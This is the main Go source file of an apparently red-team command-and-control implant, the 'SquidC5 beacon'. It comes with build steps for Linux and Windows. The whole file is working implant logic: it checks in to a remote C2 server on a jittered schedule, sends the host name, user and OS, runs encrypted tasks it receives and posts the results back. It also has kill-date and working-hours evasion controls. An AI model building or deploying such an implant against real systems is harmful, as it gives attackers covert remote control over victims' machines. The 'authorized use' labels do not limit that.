// SquidC5 native beacon — authorized lab / red team only.
// Build:
//
//	cd agents/sc5beacon && go mod tidy && go build -o sc5beacon .
//	GOOS=windows GOARCH=amd64 go build -o sc5beacon.exe .
//
// Env:
//
//	SC5_URL   https://c2:8443/api/v1/implant/beacon
//	SC5_PSK   implant PSK
//	SC5_SLEEP 5
//	SC5_JITTER 20
//	SC5_KILL_DATE unix epoch (optional)
//	SC5_MAX_MISS  max failed checkins before exit (default 0=unlimited)
//	SC5_WORK_START 0-23 optional
//	SC5_WORK_END   0-23 optional
// TLS always verifies system roots (use a real cert or lab CA in the trust store).
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"time"
)

func envInt(k string, def int) int {
	v := os.Getenv(k)
	if v == "" {
		return def
	}
	n, err := strconv.Atoi(v)
	if err != nil {
		return def
	}
	return n
}

func envFloat(k string, def float64) float64 {
	v := os.Getenv(k)
	if v == "" {
		return def
	}
	n, err := strconv.ParseFloat(v, 64)
	if err != nil {
		return def
	}
	return n
}

func sleepJitter(base float64, jitterPct float64) {
	pct := jitterPct / 100.0
	if pct < 0 {
		pct = 0
	}
	if pct > 1 {
		pct = 1
	}
	delta := base * pct
	d := base + (rand.Float64()*2-1)*delta
	if d < 0.1 {
		d = 0.1
	}
	time.Sleep(time.Duration(d * float64(time.Second)))
}

func inWorkingHours(start, end int) bool {
	if start == end && start == 0 {
		return true // unset
	}
	h := time.Now().Hour()
	if start <= end {
		return h >= start && h < end
	}
	// wrap midnight
	return h >= start || h < end
}

func main() {
	url := os.Getenv("SC5_URL")
	psk := os.Getenv("SC5_PSK")
	if url == "" || psk == "" {
		fmt.Fprintln(os.Stderr, "SC5_URL and SC5_PSK required (authorized use only)")
		os.Exit(1)
	}
	sleep := envFloat("SC5_SLEEP", 5)
	jitter := envFloat("SC5_JITTER", 20)
	killDate := envInt("SC5_KILL_DATE", 0)
	maxMiss := envInt("SC5_MAX_MISS", 0)
	workStart := envInt("SC5_WORK_START", 0)
	workEnd := envInt("SC5_WORK_END", 0)

	// Always verify TLS (system CA store / SSL_CERT_FILE). No skip-verify path.
	client := &http.Client{Timeout: 45 * time.Second}

	var sid any
	miss := 0
	host := hostName()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}

	for {
		if killDate > 0 && int(time.Now().Unix()) > killDate {
			fmt.Fprintln(os.Stderr, "kill date reached")
			return
		}
		if !inWorkingHours(workStart, workEnd) {
			sleepJitter(sleep, jitter)
			continue
		}

		payload := map[string]any{
			"session_id": sid,
			"hostname":   host,
			"username":   user,
			"os_info":    runtime.GOOS + "/" + runtime.GOARCH,
			"metadata": map[string]any{
				"agent":   "sc5beacon",
				"version": "2.0.0",
			},
		}
		if killDate > 0 {
			payload["kill_date"] = float64(killDate)
		}
		if maxMiss > 0 {
			payload["max_missed_checkins"] = maxMiss
		}

		body, err := seal(psk, payload)
		if err != nil {
			miss++
			if maxMiss > 0 && miss >= maxMiss {
				return
			}
			sleepJitter(sleep, jitter)
			continue
		}
		raw, _ := json.Marshal(body)
		resp, err := client.Post(url, "application/json", bytes.NewReader(raw))
		if err != nil {
			miss++
			if maxMiss > 0 && miss >= maxMiss {
				return
			}
			sleepJitter(sleep, jitter)
			continue
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != 200 {
			miss++
			if maxMiss > 0 && miss >= maxMiss {
				return
			}
			sleepJitter(sleep, jitter)
			continue
		}
		miss = 0

		var env map[string]any
		if json.Unmarshal(b, &env) != nil {
			sleepJitter(sleep, jitter)
			continue
		}
		// AEAD required — refuse plaintext C2 responses
		plain, err := openEnv(psk, env)
		if err != nil {
			miss++
			if maxMiss > 0 && miss >= maxMiss {
				return
			}
			sleepJitter(sleep, jitter)
			continue
		}
		if s, ok := plain["session_id"]; ok {
			sid = s
		}
		// runtime profile hint
		_ = plain["profile_id"]

		if task, ok := plain["task"].(map[string]any); ok && task != nil {
			cmd, _ := task["command"].(string)
			id, _ := task["id"].(string)
			args, _ := task["args"].(map[string]any)
			if args == nil {
				// sometimes nested differently
				if a, ok := task["args"].(map[string]any); ok {
					args = a
				} else {
					args = map[string]any{}
				}
			}
			out := runTask(cmd, args)
			done, err := seal(psk, map[string]any{
				"task_id": id,
				"result":  out,
				"status":  "completed",
			})
			if err == nil {
				dr, _ := json.Marshal(done)
				r2, err2 := client.Post(url+"/result", "application/json", bytes.NewReader(dr))
				if err2 == nil {
					r2.Body.Close()
				}
			}
		}
		sleepJitter(sleep, jitter)
	}
}
